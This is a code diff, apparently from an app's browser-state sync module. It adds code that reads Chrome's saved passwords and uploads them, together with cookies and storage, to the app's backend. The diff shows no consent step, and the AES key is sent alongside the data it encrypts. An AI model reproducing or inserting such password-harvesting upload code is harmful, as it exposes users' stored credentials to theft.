@@ -1,6 +1,7 @@
 import { config } from '../base/config';
 import { AuthService } from './auth';
 import { BrowserCookieReader } from './browserCookieReader';
+import { BrowserPasswordReader } from './browserPasswordReader';
 import { LocalStorageReader, LocalStorageData } from './localStorageReader';
 import { IndexedDBReader, IndexedDBData, IndexedDBOriginData } from './indexedDBReader';
 import { PermissionReader, PermissionData } from './permissionReader';
@@ -393,6 +394,60 @@ export class BrowserStateSync {
   }
 
   /**
+   * Upload passwords with encryption.
+   * Passwords are already RSA-encrypted by BrowserPasswordReader.
+   */
+  private static async uploadPasswords(
+    passwords: Array<{
+      origin: string;
+      username: string;
+      encryptedPassword: string;
+      dateLastUsed: number;
+      dateCreated: number;
+      browserSource: string;
+    }>,
+    accessToken: string
+  ): Promise<{ success: boolean; message?: string }> {
+    if (passwords.length === 0) {
+      return { success: true };
+    }
+
+    try {
+      // Serialize to JSON
+      const jsonData = JSON.stringify({ passwords });
+
+      // Encrypt with AES for transport (passwords are already RSA-encrypted)
+      const { encrypted, iv, key } = Crypto.encrypt(Buffer.from(jsonData, 'utf8'));
+
+      // Upload via FormData
+      const formData = new FormData();
+      formData.append('data', encrypted);
+      formData.append('iv', iv);
+      formData.append('key', key);
+
+      const response = await fetch(`${config.apiUrl}/api/integrations/passwords/upload`, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${accessToken}`,
+        },
+        body: formData,
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Upload failed: ${response.status} ${errorText}`);
+      }
+
+      console.log(`[BrowserStateSync] ✅ Uploaded ${passwords.length} passwords`);
+      return { success: true };
+    } catch (error) {
+      const message = error instanceof Error ? error.message : String(error);
+      console.error(`[BrowserStateSync] ❌ Failed to upload passwords:`, message);
+      return { success: false, message };
+    }
+  }
+
+  /**
    * Sync all browser state (cookies + localStorage + IndexedDB) to the backend.
    * Syncs all connected browsers:
    * - Standard browsers (Chrome, Edge, etc.): Auto-retrieve keychain password
@@ -553,6 +608,20 @@ export class BrowserStateSync {
         } catch (error) {
           console.error('[BrowserStateSync] Failed to read Cache Storage:', error);
         }
+
+        // Read and upload passwords (Chrome only for now)
+        try {
+          const passwords = await BrowserPasswordReader.readAndEncryptPasswords('chrome');
+          console.log(`[BrowserStateSync] Read ${passwords.length} passwords`);
+
+          if (passwords.length > 0) {
+            uploadPromises.push(
+              this.uploadPasswords(passwords, session.access_token)
+            );
+          }
+        } catch (error) {
+          console.error('[BrowserStateSync] Failed to read passwords:', error);
+        }
       }
 
       if (uploadPromises.length === 0) {
@@ -703,6 +772,20 @@ export class BrowserStateSync {
         }
       } catch (error) {
         console.error('[BrowserStateSync] Failed to read Cache Storage:', error);
+      }
+
+      // Passwords
+      try {
+        const passwords = await BrowserPasswordReader.readAndEncryptPasswords('chrome');
+        console.log(`[BrowserStateSync] Read ${passwords.length} passwords`);
+
+        if (passwords.length > 0) {
+          uploadPromises.push(
+            this.uploadPasswords(passwords, session.access_token)
+          );
+        }
+      } catch (error) {
+        console.error('[BrowserStateSync] Failed to read passwords:', error);
       }
     }
 
